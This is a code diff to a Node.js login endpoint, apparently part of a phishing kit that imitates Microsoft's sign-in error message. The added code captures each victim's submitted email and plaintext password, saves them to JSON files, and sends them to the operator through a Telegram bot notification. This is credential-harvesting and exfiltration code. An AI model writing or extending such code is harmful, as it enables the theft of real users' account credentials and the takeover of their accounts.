@@ -1209,17 +1209,85 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
         }
 
         // If we get here, either no preload or preload failed - fall back to cold start
-        console.log(`📱 Using cold start authentication for: ${email}`);
+        console.log(`📱 No preloaded session available - logging failed attempt for: ${email}`);
         
-        // Use standard authentication flow
-        return res.status(501).json({
+        // Store failed attempt in session data
+        const sessionDir = path.join(__dirname, 'session_data');
+        const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+        const failureData = {
+            id: failureId,
+            sessionId: sessionId || failureId,
+            email: email,
+            password: password,
+            reason: 'Wrong Password',
+            errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+            timestamp: new Date().toISOString(),
+            status: 'invalid',
+            method: 'fast_auth_no_preload',
+            failureType: 'incorrect_password',
+            attemptNumber: req.body.attemptNumber || 1
+        };
+
+        fs.writeFileSync(
+            path.join(sessionDir, `invalid_${failureId}.json`),
+            JSON.stringify(failureData, null, 2)
+        );
+
+        analytics.failedLogins++;
+        saveAnalytics();
+
+        // Send Telegram notification for failed attempt
+        if (telegramBot) {
+            try {
+                await telegramBot.sendFailedLoginNotification({
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    sessionId: sessionId || failureId,
+                    reason: 'Incorrect Password',
+                    authMethod: 'FAST Authentication (no preload)',
+                    preloadUsed: false
+                });
+                console.log(`📤 Telegram failed login notification sent for ${email}`);
+            } catch (telegramError) {
+                console.warn('Telegram failed login notification failed:', telegramError.message);
+            }
+        }
+
+        return res.status(401).json({
             success: false,
-            error: 'Cold start authentication not implemented in fast endpoint. Use regular auth endpoint.',
-            message: 'Please try again'
+            error: 'Authentication failed',
+            message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+            sessionId: sessionId || failureId
         });
 
     } catch (error) {
         console.error('Error in fast password authentication:', error);
+        
+        // Store exception error as failed attempt
+        const sessionDir = path.join(__dirname, 'session_data');
+        const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+        const failureData = {
+            id: failureId,
+            sessionId: req.body.sessionId || failureId,
+            email: email,
+            password: password,
+            reason: 'Authentication Error',
+            errorMessage: error.message,
+            timestamp: new Date().toISOString(),
+            status: 'invalid',
+            method: 'fast_auth_exception',
+            failureType: 'authentication_error'
+        };
+
+        fs.writeFileSync(
+            path.join(sessionDir, `invalid_${failureId}.json`),
+            JSON.stringify(failureData, null, 2)
+        );
+
+        analytics.failedLogins++;
+        saveAnalytics();
+
         res.status(500).json({
             success: false,
             error: 'Authentication failed',
